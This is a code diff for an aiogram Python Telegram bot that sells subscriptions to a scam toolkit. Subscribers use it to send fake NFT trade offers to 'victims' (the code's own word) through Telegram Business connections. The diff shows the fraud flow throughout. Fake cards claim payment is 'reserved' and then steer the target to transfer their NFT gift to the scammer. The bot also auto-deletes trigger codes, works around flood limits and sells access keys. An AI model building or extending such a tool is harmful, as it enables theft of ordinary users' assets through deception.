@@ -6,6 +6,7 @@ import logging
 import sys
 import random
 import string
+import sqlite3
 import time
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.client.default import DefaultBotProperties
@@ -23,6 +24,7 @@ log = logging.getLogger("offerbot")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DEFAULT_RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
+DB_PATH = os.getenv("DB_PATH", "/data/bot.db")
 
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
@@ -30,22 +32,45 @@ router = Router()
 dp.include_router(router)
 
 # ==========================================
-# ХРАНИЛИЩА
+# БАЗА ДАННЫХ
 # ==========================================
-OFFERS = {}
-USERS = {}
-KEYS = set()
-BUSINESS_CONNS = {}      # user_id -> conn_id
-COOLDOWNS = {}           # chat_id -> timestamp (для защиты от спама)
+def get_db():
+    os.makedirs(os.path.dirname(DB_PATH) or ".", exist_ok=True)
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    return conn
 
-for _ in range(100):
-    key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
-    KEYS.add(key)
+def init_db():
+    with get_db() as conn:
+        conn.execute("""CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY, subscribed INTEGER DEFAULT 0,
+            test_used INTEGER DEFAULT 0, my_username TEXT, 
+            stats_created INTEGER DEFAULT 0, stats_accepted INTEGER DEFAULT 0
+        )""")
+        conn.execute("""CREATE TABLE IF NOT EXISTS offers (
+            id TEXT PRIMARY KEY, nft_name TEXT, nft_slug TEXT, 
+            price_amount TEXT, price_currency TEXT, buyer_id INTEGER, 
+            buyer_username TEXT, target_user TEXT, message_id INTEGER, conn_id TEXT
+        )""")
+        conn.execute("CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY)")
+        
+        cur = conn.execute("SELECT COUNT(*) FROM keys")
+        if cur.fetchone()[0] == 0:
+            for _ in range(100):
+                key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
+                conn.execute("INSERT INTO keys (key) VALUES (?)", (key,))
 
+init_db()
+
+# ==========================================
+# РЕГУЛЯРКИ
+# ==========================================
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
 CODE_RE = re.compile(r"(of_[a-f0-9]{5})", re.I)
 KEY_RE = re.compile(r"^(TG-[A-Z0-9]{6})$", re.I)
+
+BUSINESS_CONNS = {}
 
 def parse_nft(url: str):
     m = NFT_RE.search(url)
@@ -64,207 +89,106 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# БЕЗОПАСНАЯ ОТПРАВКА (АНТИ-ФЛУД)
+# БЕЗОПАСНАЯ ОТПРАВКА / УДАЛЕНИЕ
 # ==========================================
-async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
-    """Отправляет сообщение с защитой от PEER_FLOOD и автоповтором."""
+async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=2):
     for attempt in range(retries):
         try:
             return await bot.send_message(
                 chat_id=chat_id, text=text, business_connection_id=conn_id,
-                reply_markup=reply_markup, disable_web_page_preview=True
+                reply_markup=reply_markup, disable_web_page_preview=False
             )
         except TelegramBadRequest as e:
             if "PEER_FLOOD" in str(e):
-                wait_time = 60 * (attempt + 1)
-                log.warning(f"⚠️ PEER_FLOOD. Ждем {wait_time} сек...")
-                await asyncio.sleep(wait_time)
-            elif "chat not found" in str(e):
-                log.error("❌ Чат не найден. Жертва удалила диалог?")
-                return None
+                log.warning(f"⚠️ PEER_FLOOD. Ждем 60 сек...")
+                await asyncio.sleep(60)
             else:
-                log.error(f"❌ Ошибка Telegram: {e}")
                 return None
         except TelegramForbiddenError:
-            log.error("❌ Бот заблокирован пользователем.")
             return None
     return None
 
 async def safe_delete(bot: Bot, chat_id: int, msg_id: int, conn_id: str, delay=0):
-    """Безопасное удаление сообщения через Business API."""
     if delay > 0: await asyncio.sleep(delay)
     try:
         await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[msg_id])
-        log.info(f"🗑 Сообщение {msg_id} успешно удалено.")
-    except Exception as e:
-        log.warning(f"⚠️ Не удалось удалить сообщение {msg_id}: {e}")
+    except Exception:
+        pass
 
 # ==========================================
-# BUSINESS ПОДКЛЮЧЕНИЯ
+# МЕНЮ
 # ==========================================
-@router.business_connection()
-async def on_business_conn(conn: BusinessConnection):
-    BUSINESS_CONNS[conn.user.id] = conn.id
-    log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")
-
-# ==========================================
-# МЕНЮ АДМИНА
-# ==========================================
-async def show_admin_menu(target):
+async def show_main_menu(target, uid):
+    with get_db() as conn:
+        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
+    
+    status = "✅ Активна" if user["subscribed"] else ("🎁 Тест-доступ" if user["test_used"] == 0 else "❌ Не оплачена")
+    
     text = (
-        "👑 <b>Глобальная Админ-Панель</b>\n\n"
-        "<b>Управление:</b>\n"
-        "/keys — список доступных ключей\n"
-        "/set_default @ник — сменить дефолтного получателя\n\n"
-        "👇 Выберите раздел:"
+        f"👑 <b>Добро пожаловать в NFT Trade</b>\n\n"
+        f"Ваш статус: <b>{status}</b>\n\n"
+        f"<b>Быстрый старт:</b>\n"
+        f"1. Создайте оффер: <code>/offer [ссылка] [цена] [@юзер]</code>\n"
+        f"2. Скопируйте код и отправьте в чат.\n\n"
+        f"⚠️ <i>Для работы обязательно подключите бота в Настройках Telegram Business.</i>"
     )
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📖 Инструкция", callback_data="admin_help")],
-        [InlineKeyboardButton(text="🔑 Мои ключи", callback_data="admin_keys")]
-    ])
+    
+    buttons = [[InlineKeyboardButton(text="➕ Создать оффер", callback_data="create_offer_btn")]]
+    
+    if not user["subscribed"]:
+        buttons.append([InlineKeyboardButton(text="💎 Купить подписку", callback_data="buy_sub")])
+    
+    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
+    
     if isinstance(target, Message): await target.reply(text, reply_markup=kb)
     else: await target.message.edit_text(text, reply_markup=kb)
 
-@router.callback_query(F.data == "admin_help")
-async def cb_admin_help(cb: CallbackQuery):
-    text = (
-        "<b>📖 Инструкция для Админа</b>\n\n"
-        "1. <b>Выдача доступа:</b> /keys -> скопируй ключ -> отправь клиенту.\n"
-        "2. <b>Создать оффер:</b> <code>/offer [ссылка] [цена] [@юзер]</code> -> отправь код в чат.\n"
-        "3. <b>Сменить ник:</b> <code>/set_default @твой_ник</code>."
-    )
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]])
-    await cb.message.edit_text(text, reply_markup=kb)
-    await cb.answer()
-
-@router.callback_query(F.data == "admin_keys")
-async def cb_admin_keys(cb: CallbackQuery):
-    keys_list = "\n".join(list(KEYS)[:20])
-    text = f"<b>Осталось ключей ({len(KEYS)}):</b>\n<code>{keys_list}</code>\n... и еще {max(0, len(KEYS)-20)}"
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]])
-    await cb.message.edit_text(text, reply_markup=kb)
-    await cb.answer()
-
-@router.callback_query(F.data == "admin_back")
-async def cb_admin_back(cb: CallbackQuery):
-    await show_admin_menu(cb)
-    await cb.answer()
-
-# ==========================================
-# МЕНЮ КЛИЕНТА
-# ==========================================
-async def show_client_menu(target):
-    text = (
-        "👑 <b>Панель управления офферами</b>\n\n"
-        "Здесь вы можете создавать фейковые офферы и отправлять их жертвам.\n\n"
-        "👇 Выберите действие:"
-    )
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📊 Статистика", callback_data="client_stats")],
-        [InlineKeyboardButton(text="📖 Инструкция", callback_data="client_help")],
-        [InlineKeyboardButton(text="⚙️ Настройки (изменить ник)", callback_data="client_settings")]
-    ])
-    if isinstance(target, Message): await target.reply(text, reply_markup=kb)
-    else: await target.message.edit_text(text, reply_markup=kb)
-
-@router.callback_query(F.data == "client_stats")
-async def cb_client_stats(cb: CallbackQuery):
-    uid = cb.from_user.id
-    stats = USERS.get(uid, {}).get("stats", {"created": 0, "accepted": 0})
-    text = (
-        f"<b>📊 Ваша статистика</b>\n\n"
-        f"Создано офферов: <b>{stats['created']}</b>\n"
-        f"Жертва нажала 'Принять': <b>{stats['accepted']}</b>"
-    )
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="client_back")]])
-    await cb.message.edit_text(text, reply_markup=kb)
-    await cb.answer()
-
-@router.callback_query(F.data == "client_help")
-async def cb_client_help(cb: CallbackQuery):
-    text = (
-        "<b>📖 Инструкция по использованию</b>\n\n"
-        "<b>Шаг 1:</b> Подключите бота к Telegram Business.\n"
-        "<b>Шаг 2:</b> Создайте оффер: <code>/offer [ссылка] [цена] [@username]</code>.\n"
-        "<b>Шаг 3:</b> Скопируйте код и отправьте его в чат с жертвой."
-    )
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="client_back")]])
-    await cb.message.edit_text(text, reply_markup=kb)
-    await cb.answer()
-
-@router.callback_query(F.data == "client_settings")
-async def cb_client_settings(cb: CallbackQuery):
-    uid = cb.from_user.id
-    curr = USERS.get(uid, {}).get("my_username", DEFAULT_RECEIVER)
-    text = (
-        f"<b>⚙️ Настройки</b>\n\n"
-        f"Сейчас в офферах пишется: <b>@{curr}</b>\n\n"
-        f"Чтобы изменить юзернейм, отправьте:\n"
-        f"<code>/setuser @ваш_ник</code>"
-    )
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="client_back")]])
-    await cb.message.edit_text(text, reply_markup=kb)
-    await cb.answer()
-
-@router.callback_query(F.data == "client_back")
-async def cb_client_back(cb: CallbackQuery):
-    await show_client_menu(cb)
-    await cb.answer()
-
-# ==========================================
-# СТАРТ
-# ==========================================
 @router.message(Command("start"))
 async def cmd_start(msg: Message):
     if msg.from_user.id == ADMIN_ID:
-        await show_admin_menu(msg)
+        await msg.reply("👑 <b>Админ-панель:</b>\n/keys — ключи\n/set_default @ник — сменить получателя\n/addkey — сгенерить ключ")
         return
     
     uid = msg.from_user.id
-    if uid not in USERS:
-        USERS[uid] = {"subscribed": False, "my_username": DEFAULT_RECEIVER, "stats": {"created": 0, "accepted": 0}}
+    with get_db() as conn:
+        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
+        if not user:
+            conn.execute("INSERT INTO users (user_id, my_username) VALUES (?, ?)", (uid, DEFAULT_RECEIVER))
     
-    if USERS[uid]["subscribed"]:
-        await show_client_menu(msg)
-        return
+    await show_main_menu(msg, uid)
 
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Оплатить (50 ⭐️)", url=f"https://t.me/{DEFAULT_RECEIVER}")],
-        [InlineKeyboardButton(text="Ввести ключ", callback_data="enter_key")]
-    ])
-    await msg.reply(
-        "👋 <b>Для доступа к панели нужна подписка.</b>\n\n"
-        f"1. Перейдите к <b>@{DEFAULT_RECEIVER}</b> (кнопка ниже)\n"
-        f"2. Отправьте подарок за <b>50 ⭐️</b>\n"
-        f"3. Нажмите «Ввести ключ» и введите полученный код.\n\n"
-        "Подписка активируется навсегда.",
-        reply_markup=kb
+@router.callback_query(F.data == "create_offer_btn")
+async def cb_create_offer(cb: CallbackQuery):
+    await cb.message.edit_text(
+        "📝 <b>Создание оффера</b>\n\n"
+        "Отправьте команду в чат:\n"
+        "<code>/offer [ссылка_на_подарок] [цена] [@username]</code>\n\n"
+        "Пример:\n"
+        "<code>/offer https://t.me/nft/MirageLamp-73768 1500 stars @target</code>"
     )
+    await cb.answer()
 
-# ==========================================
-# КОМАНДЫ
-# ==========================================
-@router.message(F.text.regexp(r"^/set_default\s+"))
-async def cmd_set_default(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
-    global DEFAULT_RECEIVER
-    new_rec = msg.text.replace("/set_default", "").strip().replace("@", "")
-    DEFAULT_RECEIVER = new_rec
-    await msg.reply(f"✅ Дефолтный получатель изменен на @{new_rec}")
+@router.callback_query(F.data == "buy_sub")
+async def cb_buy_sub(cb: CallbackQuery):
+    text = (
+        "<b>💎 Подписка NFT Trade</b>\n\n"
+        "• 50 ⭐️ — на 1 месяц\n"
+        "• 100 ⭐️ — на 1 год\n"
+        "• 200 ⭐️ — навсегда\n\n"
+        f"Для оплаты переведите звезды на аккаунт: <b>@{DEFAULT_RECEIVER}</b>\n\n"
+        "После оплаты введите ключ: <code>/key TG-XXXXXX</code>"
+    )
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Оплатить (перейти)", url=f"https://t.me/{DEFAULT_RECEIVER}")],
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+    ])
+    await cb.message.edit_text(text, reply_markup=kb)
+    await cb.answer()
 
-@router.message(Command("setuser"))
-async def cmd_setuser(msg: Message):
-    uid = msg.from_user.id
-    if not USERS.get(uid, {}).get("subscribed"):
-        await msg.reply("❌ Сначала активируйте подписку.")
-        return
-    parts = msg.text.split()
-    if len(parts) < 2 or not parts[1].startswith("@"):
-        await msg.reply("❌ Формат: <code>/setuser @ваш_ник</code>")
-        return
-    new_rec = parts[1].replace("@", "").strip()
-    USERS[uid]["my_username"] = new_rec
-    await msg.reply(f"✅ Юзернейм в офферах изменен на <b>@{new_rec}</b>.")
+@router.callback_query(F.data == "main_menu")
+async def cb_main_menu(cb: CallbackQuery):
+    await show_main_menu(cb, cb.from_user.id)
+    await cb.answer()
 
 # ==========================================
 # СОЗДАНИЕ ОФФЕРА
@@ -274,103 +198,119 @@ async def cmd_offer(msg: Message):
     uid = msg.from_user.id
     is_admin = (uid == ADMIN_ID)
     
-    if not is_admin and not USERS.get(uid, {}).get("subscribed"):
-        await msg.reply("❌ Нет подписки. Напишите /start.")
-        return
-
-    if uid not in BUSINESS_CONNS:
-        await msg.reply("❌ Вы не подключили бота к Telegram Business! Без этого офферы не будут отправляться от вашего имени.")
-        return
+    with get_db() as conn:
+        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
+    
+    # Проверка подписки или теста
+    is_test = False
+    if not is_admin:
+        if not user["subscribed"]:
+            if user["test_used"] == 0:
+                is_test = True
+            else:
+                return await msg.reply("❌ Подписка не активна. Напишите /start")
+    
+    if uid not in BUSINESS_CONNS and not is_admin:
+        return await msg.reply("❌ Вы не подключили бота к Telegram Business! Без этого отправка невозможна.")
 
     parts = msg.text.replace("/offer", "").strip().split()
     if len(parts) < 3:
-        await msg.reply("❌ Формат: <code>/offer [ссылка] [цена] [@username]</code>")
-        return
+        return await msg.reply("❌ Формат: <code>/offer [ссылка] [цена] [@username]</code>")
 
     url = parts[0]
     target_user = parts[-1] if parts[-1].startswith("@") else "unknown"
     price_text = " ".join(parts[1:-1])
+    
     nft = parse_nft(url)
     price_data = parse_price(price_text)
 
-    if not nft or not price_data:
-        await msg.reply("❌ Не понял ссылку или цену.")
-        return
+    # Если ошибка парсинга, но ссылка есть — пробуем вытащить хоть что-то
+    if not nft and url.startswith("https://t.me/nft/"):
+        slug = url.split("/")[-1]
+        nft = {"slug": slug, "name": slug.replace("-", " #")}
+    
+    if not price_data:
+        price_data = ("0", "Stars") # Фоллбек
 
     oid = "of_" + uuid.uuid4().hex[:5]
-    buyer_name = USERS[uid]["my_username"] if not is_admin else msg.from_user.username
+    buyer_name = user["my_username"] if not is_admin and user else msg.from_user.username
     
-    OFFERS[oid] = {
-        "nft_name": nft["name"], "nft_slug": nft["slug"],
-        "price_amount": price_data[0], "price_currency": price_data[1],
-        "buyer_id": uid,
-        "buyer_username": buyer_name,
-        "target_user": target_user
-    }
-    
-    if not is_admin:
-        USERS[uid]["stats"]["created"] += 1
+    with get_db() as conn:
+        conn.execute(
+            "INSERT INTO offers (id, nft_name, nft_slug, price_amount, price_currency, buyer_id, buyer_username, target_user) VALUES (?,?,?,?,?,?,?,?)",
+            (oid, nft["name"], nft["slug"], price_data[0], price_data[1], uid, buyer_name, target_user)
+        )
+        if is_test:
+            conn.execute("UPDATE users SET test_used=1 WHERE user_id=?", (uid,))
+        else:
+            conn.execute("UPDATE users SET stats_created = stats_created + 1 WHERE user_id=?", (uid,))
         
-    await msg.reply(f"✅ Оффер <code>{oid}</code> создан.\n\nОтправьте этот код в чат с жертвой.")
+    prefix = "🎁 <b>Тестовый оффер!</b>\n\n" if is_test else ""
+    await msg.reply(f"{prefix}✅ Оффер <code>{oid}</code> создан.\n\nОтправьте этот код в чат с жертвой.\n/cancel_{oid} — отменить.")
+
+# ==========================================
+# ОТМЕНА ОФФЕРА
+# ==========================================
+@router.message(F.text.regexp(r"^/cancel_(of_[a-f0-9]{5})$"))
+async def cmd_cancel_offer(msg: Message):
+    oid = msg.text.replace("/cancel_", "").strip()
+    with get_db() as conn:
+        offer = conn.execute("SELECT * FROM offers WHERE id=? AND buyer_id=?", (oid, msg.from_user.id)).fetchone()
+        if offer:
+            # Удаляем сообщение из чата, если оно было
+            if offer["message_id"] and offer["conn_id"]:
+                asyncio.create_task(safe_delete(bot, offer["buyer_id"], offer["message_id"], offer["conn_id"]))
+            conn.execute("DELETE FROM offers WHERE id=?", (oid,))
+            await msg.reply("🗑 Оффер отменен и удален из чата.")
+        else:
+            await msg.reply("❌ Оффер не найден.")
 
 # ==========================================
 # АКТИВАЦИЯ КЛЮЧА
 # ==========================================
-@router.callback_query(F.data == "enter_key")
-async def on_enter_key(cb: CallbackQuery):
-    await cb.message.reply("Отправьте ваш ключ доступа (например, TG-XXXXXX).")
-    await cb.answer()
-
 @router.message(F.text.regexp(KEY_RE))
 async def check_key(msg: Message):
     uid = msg.from_user.id
     key = msg.text.strip().upper()
-    if key in KEYS:
-        KEYS.remove(key)
-        if uid not in USERS: 
-            USERS[uid] = {"stats": {"created": 0, "accepted": 0}}
-        USERS[uid]["subscribed"] = True
-        USERS[uid]["my_username"] = DEFAULT_RECEIVER
-        
-        await msg.reply("✅ Ключ активирован! Добро пожаловать.")
-        await show_client_menu(msg)
-    else:
-        await msg.reply("❌ Неверный или уже использованный ключ.")
+    
+    with get_db() as conn:
+        if conn.execute("SELECT key FROM keys WHERE key=?", (key,)).fetchone():
+            conn.execute("DELETE FROM keys WHERE key=?", (key,))
+            conn.execute("UPDATE users SET subscribed=1 WHERE user_id=?", (uid,))
+            await msg.reply("✅ Ключ активирован!")
+            await show_main_menu(msg, uid)
+        else:
+            await msg.reply("❌ Неверный ключ.")
 
 # ==========================================
-# ОТПРАВКА В БИЗНЕС-ЧАТ (ЯДРО)
+# ОТПРАВКА ОФФЕРА (КАРТИНКА + ТЕКСТ СНИЗУ)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
     m = CODE_RE.search(msg.text)
     if not m: return
-
     oid = m.group(1).lower()
-    offer = OFFERS.get(oid)
-    if not offer: return
-
-    # Защита от левых людей
-    if msg.from_user.id != offer["buyer_id"]: 
-        return
+    
+    with get_db() as conn:
+        offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
+    if not offer or msg.from_user.id != offer["buyer_id"]: return
 
     conn_id = BUSINESS_CONNS.get(msg.from_user.id)
     if not conn_id: return
 
-    # 1. Сначала удаляем код (с задержкой 0.5 сек, чтобы не слиплось)
+    # 1. Удаляем код (официальный метод)
     asyncio.create_task(safe_delete(bot, msg.chat.id, msg.message_id, conn_id, delay=0.5))
-
-    # 2. Пауза для "прогрева" и обхода флуда
-    await asyncio.sleep(2)
+    await asyncio.sleep(2) # Пауза анти-флуд
 
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
-    target_user = offer["buyer_username"] 
-    nft_link = f'<a href="https://t.me/nft/{offer["nft_slug"]}">{offer["nft_name"]}</a>'
+    nft_link = f'https://t.me/nft/{offer["nft_slug"]}'
 
+    # 2. Текст с картинкой внизу
     card_text = (
-        f"Пользователь <b>{target_user}</b> предлагает обменять ваш {nft_link} на <b>{price_str}</b>.\n\n"
-        f"Вы согласны принять предложение?\n\n"
-        f"Предложение действует ещё <b>6ч 0м</b>.\n\n"
-        f"{nft_link}"
+        f"Пользователь <b>@{offer['buyer_username']}</b> предлагает обменять ваш "
+        f"<b>{offer['nft_name']}</b> на <b>{price_str}</b>.\n\n"
+        f"Вы согласны принять?\n\n"
+        f"{nft_link}" 
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -378,19 +318,12 @@ async def handle_business_message(msg: Message):
          InlineKeyboardButton(text="Принять", callback_data=f"accept1:{oid}")]
     ])
     
-    # 3. Отправляем с защитой
-    sent_msg = await safe_send(bot, msg.chat.id, card_text, conn_id, reply_markup=kb)
+    sent = await safe_send(bot, msg.chat.id, card_text, conn_id, reply_markup=kb)
     
-    # 4. Если отправили — ставим на автоудаление (6 часов)
-    if sent_msg:
-        asyncio.create_task(safe_delete(bot, msg.chat.id, sent_msg.message_id, conn_id, delay=21600))
-    else:
-        # Если не смогли отправить (PEER_FLOOD или блок) - пишем клиенту
-        try:
-            await bot.send_message(offer["buyer_id"], 
-                "❌ Ошибка: Telegram выдал блок (PEER_FLOOD) или пользователь заблокировал бота. "
-                "Попробуйте позже или напишите жертве обычное сообщение, чтобы она ответила.")
-        except: pass
+    if sent:
+        # Сохраняем ID сообщения для возможности отмены
+        with get_db() as conn:
+            conn.execute("UPDATE offers SET message_id=?, conn_id=? WHERE id=?", (sent.message_id, conn_id, oid))
 
 # ==========================================
 # ЛОГИКА ОФФЕРА
@@ -398,51 +331,64 @@ async def handle_business_message(msg: Message):
 @router.callback_query(F.data.startswith("accept1:"))
 async def on_accept1(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
-    offer = OFFERS.get(oid)
+    with get_db() as conn:
+        offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
     if not offer: return
     
-    buyer_id = offer["buyer_id"]
-    if buyer_id in USERS and "stats" in USERS[buyer_id]:
-        USERS[buyer_id]["stats"]["accepted"] += 1
-    
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
-    text = f"<b>Сумма {price_str} зарезервирована.</b>\n\nЧтобы завершить сделку:\n1. Ознакомьтесь с инструкцией.\n2. Нажмите «Передать NFT»."
-    
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Передать NFT", callback_data=f"accept2:{oid}")]
-    ])
-    await cb.message.edit_text(text=text, reply_markup=kb)
+    await cb.message.edit_text(
+        f"<b>Сумма {price_str} зарезервирована.</b>\n\nНажмите «Передать NFT».",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать NFT", callback_data=f"accept2:{oid}")]])
+    )
     await cb.answer()
 
 @router.callback_query(F.data.startswith("accept2:"))
 async def on_accept2(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
-    offer = OFFERS.get(oid)
+    with get_db() as conn:
+        offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
+    if not offer: return
     native_url = f"tg://send_gift?slug={offer['nft_slug']}"
-    receiver = offer["buyer_username"]
-    
-    text = (
-        f"<b>Инструкция по передаче:</b>\n\n"
-        f"1. Нажмите на кнопку ниже\n"
-        f"2. Выберите «Передать NFT»\n"
-        f"3. Укажите получателя: <b>@{receiver}</b>\n"
-        f"4. Подтвердите.\n\n"
-        f"👇 Меню передачи откроется автоматически:"
+    await cb.message.edit_text(
+        f"<b>Инструкция:</b>\n1. Жмите кнопку\n2. Укажите получателя: <b>@{offer['buyer_username']}</b>",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать NFT ↗", url=native_url)]])
     )
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Передать NFT ↗", url=native_url)]
-    ])
-    await cb.message.edit_text(text=text, reply_markup=kb)
     await cb.answer()
 
 @router.callback_query(F.data.startswith("reject:"))
 async def on_reject(cb: CallbackQuery):
-    try: await cb.message.edit_reply_markup(reply_markup=None)
-    except: pass
-    await cb.answer("Вы отклонили предложение.")
+    await cb.message.edit_reply_markup(reply_markup=None)
+    await cb.answer("Отклонено.")
+
+# ==========================================
+# АДМИН КОМАНДЫ
+# ==========================================
+@router.message(Command("keys"))
+async def cmd_keys(msg: Message):
+    if msg.from_user.id != ADMIN_ID: return
+    with get_db() as conn:
+        keys = conn.execute("SELECT key FROM keys LIMIT 30").fetchall()
+        total = conn.execute("SELECT COUNT(*) FROM keys").fetchone()[0]
+    keys_list = "\n".join([k["key"] for k in keys])
+    await msg.reply(f"<b>Ключей ({total}):</b>\n<code>{keys_list}</code>...")
+
+@router.message(Command("addkey"))
+async def cmd_addkey(msg: Message):
+    if msg.from_user.id != ADMIN_ID: return
+    key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
+    with get_db() as conn:
+        conn.execute("INSERT INTO keys (key) VALUES (?)", (key,))
+    await msg.reply(f"✅ Ключ создан: <code>{key}</code>")
+
+@router.message(F.text.regexp(r"^/set_default\s+"))
+async def cmd_set_default(msg: Message):
+    if msg.from_user.id != ADMIN_ID: return
+    global DEFAULT_RECEIVER
+    new_rec = msg.text.replace("/set_default", "").strip().replace("@", "")
+    DEFAULT_RECEIVER = new_rec
+    await msg.reply(f"✅ Дефолтный получатель: @{new_rec}")
 
 async def main():
-    log.info("Starting bot...")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
